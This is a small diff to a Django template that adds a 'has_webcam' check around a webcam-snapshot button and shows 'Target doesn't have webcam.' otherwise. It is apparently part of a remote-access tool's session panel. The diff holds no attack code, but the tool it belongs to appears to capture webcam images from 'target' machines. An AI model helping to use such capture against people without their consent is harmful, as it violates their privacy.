@@ -1,6 +1,7 @@
 {% extends "server/session.html" %}
 {% block session_content %}
 
+{% if has_webcam %}
 <p class="mb-4">
 	<a class="btn btn-outline-primary" href="{% url "action_webcam" id %}">Prendre un snapshot de la webcam</a>
 </p>
@@ -22,6 +23,11 @@
 				{% endfor %}
     </div>
 </div>
+{% endif %}
+
+	{% if not has_webcam %}
+	<p class="text-center"><font color="red">Target doesn't have webcam.</font></p>
+	{% endif %}
 
 
 {% endblock %}
